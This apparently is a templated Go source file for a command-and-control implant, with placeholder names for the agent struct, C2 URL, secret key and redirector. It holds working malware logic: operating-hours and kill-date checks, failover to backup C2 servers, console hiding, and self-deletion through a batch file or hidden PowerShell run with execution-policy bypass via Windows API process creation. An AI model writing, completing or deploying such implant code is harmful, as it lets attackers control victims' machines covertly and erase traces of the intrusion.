func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WORKING_HOURS_FUNC}() bool {
	now := time.Now()
	if a.{AGENT_WORKING_HOURS_FIELD}.Timezone == "UTC" {
		// Use UTC time
		now = now.UTC()
	} else {
		// Use local time for other timezones (for simplicity)
		// Later on, We might want to parse the timezone
	}

	// Go's Weekday: 0=Sunday, 1=Monday, 2=Tuesday, etc.
	currentWeekday := int(now.Weekday())
	if currentWeekday == 0 {
		currentWeekday = 7 // Sunday is day 7 in our config (1-7 for Monday-Sunday)
	}

	allowed := false
	for _, day := range a.{AGENT_WORKING_HOURS_FIELD}.Days {
		if day == currentWeekday {
			allowed = true
			break
		}
	}

	if !allowed {
		return false
	}

	// Check if current hour is within working hours
	currentHour := now.Hour()
	if currentHour >= a.{AGENT_WORKING_HOURS_FIELD}.StartHour && currentHour < a.{AGENT_WORKING_HOURS_FIELD}.EndHour {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_KILL_DATE_FUNC}() bool {
	killTime, err := time.Parse("2006-01-02T15:04:05Z", a.{AGENT_KILL_DATE_FIELD})
	if err != nil {
		// If we can't parse the kill date, assume no kill date (return false to not kill)
		return false
	}

	now := time.Now().UTC()
	return now.After(killTime)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
	if !a.{AGENT_USE_FAILOVER_FIELD} || len(a.{AGENT_FAILOVER_URLS_FIELD}) == 0 {
		return false
	}

	// Check if we should try failover based on failure count
	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} < a.{AGENT_MAX_FAIL_COUNT_FIELD} {
		return false
	}

	// Set flag to indicate we're in a failover attempt to prevent recursion
	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = true

	// Try to register with a failover C2
	originalC2URL := a.{AGENT_CURRENT_C2_URL_FIELD}
	for _, failoverURL := range a.{AGENT_FAILOVER_URLS_FIELD} {
		a.{AGENT_CURRENT_C2_URL_FIELD} = failoverURL

		// Try to register with the failover server
		err := a.{AGENT_REGISTER_FUNC}()
		if err == nil {
			// Successfully connected to failover C2
			a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0  // Reset failure count
			a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
			a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
			return true
		} else {
		}
	}

	// If all failover attempts failed, return to the original main C2
	a.{AGENT_CURRENT_C2_URL_FIELD} = originalC2URL
	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INCREMENT_FAIL_COUNT_FUNC}() {
	a.{AGENT_CURRENT_FAIL_COUNT_FIELD}++
	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()

	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} >= a.{AGENT_MAX_FAIL_COUNT_FIELD} && !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
		a.{AGENT_TRY_FAILOVER_FUNC}()
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_RESET_FAIL_COUNT_FUNC}() {
	a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
	executable, err := os.Executable()
	if err != nil {
		os.Exit(0)
		return
	}

	// Create a temporary batch file that will delete the executable and itself
	tempDir := os.TempDir()
	batchFileName := fmt.Sprintf("%s\\del_%d.bat", tempDir, time.Now().UnixNano())

	batchContent := fmt.Sprintf(`@echo off
timeout /t 2 /nobreak >nul
del "%s" >nul 2>&1
del "%%~f0" >nul 2>&1
`, executable)

	err = ioutil.WriteFile(batchFileName, []byte(batchContent), 0755)
	if err != nil {
		// If batch file creation fails, try PowerShell method
		psCommand := fmt.Sprintf(`
			Start-Sleep -Seconds 2
			$targetPath = '%s'
			$maxAttempts = 10
			$attempt = 0
			while ($attempt -lt $maxAttempts) {
				try {
					if (Test-Path $targetPath) {
						Remove-Item -Path $targetPath -Force -ErrorAction Stop
					}
					break
				} catch {
					Start-Sleep -Milliseconds 500
					$attempt++
				}
			}
		`, executable)

		go func() {
			time.Sleep(50 * time.Millisecond)
			_, err := executeSelfDeleteCommand(psCommand)
			if err != nil {
				cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
				cmd.Start()
			}
			os.Exit(0)
		}()
		return
	}

	// Execute the batch file using the stealthy Windows API approach
	go func() {
		time.Sleep(50 * time.Millisecond) // Brief delay to ensure process exits

		batchCmd := fmt.Sprintf(`cmd /c "%s"`, batchFileName)
		_, err := executeSelfDeleteCommand(batchCmd)
		if err != nil {
			// If stealthy execution fails, fall back to regular hidden execution
			cmd := exec.Command("cmd", "/c", batchFileName)
			cmd.Start()
		}

		os.Exit(0)
	}()
}

// executeSelfDeleteCommand executes a command using Windows API calls to hide the console window
func executeSelfDeleteCommand(command string) (string, error) {
	if runtime.GOOS != "windows" {
		// For non-Windows systems, use regular execution
		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("[ERROR] Self-delete command execution failed: %v", err), nil
		}
		if len(output) > 1024*1024 { // 1MB limit
			output = append(output[:1024*1024], []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
		}
		return string(output), nil
	}

	// Determine if this is a PowerShell command or a regular command
	isPowerShell := strings.Contains(strings.ToLower(command), "powershell") ||
				   strings.Contains(command, "-EncodedCommand") ||
				   (strings.Contains(command, "@") && strings.Contains(command, "{"))

	var shell string
	if isPowerShell {
		// For PowerShell commands, use Base64 encoding to avoid CLIXML output format issues
		encodedCommand := base64.StdEncoding.EncodeToString([]byte(command))
		// If the command is already a powershell command, use it directly
		if strings.Contains(strings.ToLower(command), "powershell") {
			shell = fmt.Sprintf("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive %s", command)
		} else {
			shell = fmt.Sprintf("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -EncodedCommand %s", encodedCommand)
		}
	} else {
		// For regular commands like batch files
		shell = command
	}

	// Create anonymous pipes for capturing output
	var saAttr SECURITY_ATTRIBUTES
	saAttr.NLength = uint32(unsafe.Sizeof(saAttr))
	saAttr.bInheritHandle = 1 // Set inherit handle to true
	saAttr.LPSecurityDescriptor = 0

	// Create stdout pipe (though we won't read it for self-delete)
	var stdoutRead, stdoutWrite uintptr
	ret, _, _ := procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stdoutRead)),
		uintptr(unsafe.Pointer(&stdoutWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		// If pipe creation fails, fall back to regular execution
		if isPowerShell {
			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
			cmd.Start()
		} else {
			cmd := exec.Command("cmd", "/c", strings.Replace(command, "cmd /c ", "", 1))
			cmd.Start()
		}
		return "", nil
	}

	// Create stderr pipe (though we won't read it for self-delete)
	var stderrRead, stderrWrite uintptr
	ret, _, _ = procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stderrRead)),
		uintptr(unsafe.Pointer(&stderrWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		// Fall back to regular execution
		if isPowerShell {
			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
			cmd.Start()
		} else {
			cmd := exec.Command("cmd", "/c", strings.Replace(command, "cmd /c ", "", 1))
			cmd.Start()
		}
		return "", nil
	}

	// Prepare the command line
	cmdLine, err := syscall.UTF16PtrFromString(shell)
	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		// Fall back to regular execution
		if isPowerShell {
			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
			cmd.Start()
		} else {
			cmd := exec.Command("cmd", "/c", strings.Replace(command, "cmd /c ", "", 1))
			cmd.Start()
		}
		return "", nil
	}

	// Initialize STARTUPINFO structure with pipe handles
	var si STARTUPINFO
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
	si.ShowWindow = SW_HIDE // Hide the window
	si.StdInput = 0        // Use default input
	si.StdOutput = stdoutWrite // Redirect stdout to our pipe (child writes to this)
	si.StdError = stderrWrite  // Redirect stderr to our pipe (child writes to this)

	// Initialize PROCESS_INFORMATION structure
	var pi PROCESS_INFORMATION

	// Create the process with hidden window and redirected output
	err = createProcess(
		nil, // applicationName
		cmdLine, // commandLine
		nil, // processAttributes
		nil, // threadAttributes
		true, // inheritHandles - important for pipe inheritance
		CREATE_NO_WINDOW, // creationFlags - this is key for hiding the window
		0, // environment
		nil, // currentDirectory
		&si, // startupInfo
		&pi, // processInformation
	)

	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		// Fall back to regular execution
		if isPowerShell {
			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
			cmd.Start()
		} else {
			cmd := exec.Command("cmd", "/c", strings.Replace(command, "cmd /c ", "", 1))
			cmd.Start()
		}
		return "", nil
	}

	// Close the write handles
	syscall.CloseHandle(syscall.Handle(stdoutWrite))
	syscall.CloseHandle(syscall.Handle(stderrWrite))

	// Don't wait for the deletion process to complete - let it run independently
	// This allows the current process to exit immediately
	syscall.CloseHandle(syscall.Handle(pi.Process))
	syscall.CloseHandle(syscall.Handle(pi.Thread))

	return "", nil
}

func {AGENT_HIDE_CONSOLE_FUNC}() {
	consoleHandle, _, _ := procGetConsoleWindow.Call()
	if consoleHandle != 0 {
		procShowWindow.Call(
			consoleHandle,  // HWND - console window handle
			uintptr(0),     // nCmdShow - SW_HIDE constant
		)
	}

	procFreeConsole.Call()
}

func (a *{AGENT_STRUCT_NAME}) isNumeric(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

func main() {
	{AGENT_HIDE_CONSOLE_FUNC}()

	agentID := "{AGENT_ID}"
	secretKey := "{SECRET_KEY}"
	c2URL := "{C2_URL}"
	redirectorHost := "{REDIRECTOR_HOST}"
	redirectorPort := {REDIRECTOR_PORT}
	useRedirector := {USE_REDIRECTOR}
	disableSandbox := {DISABLE_SANDBOX}

	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost, redirectorPort, useRedirector, disableSandbox)
	if err != nil {
		os.Exit(1)
	}

	agent.{AGENT_RUN_FUNC}()
}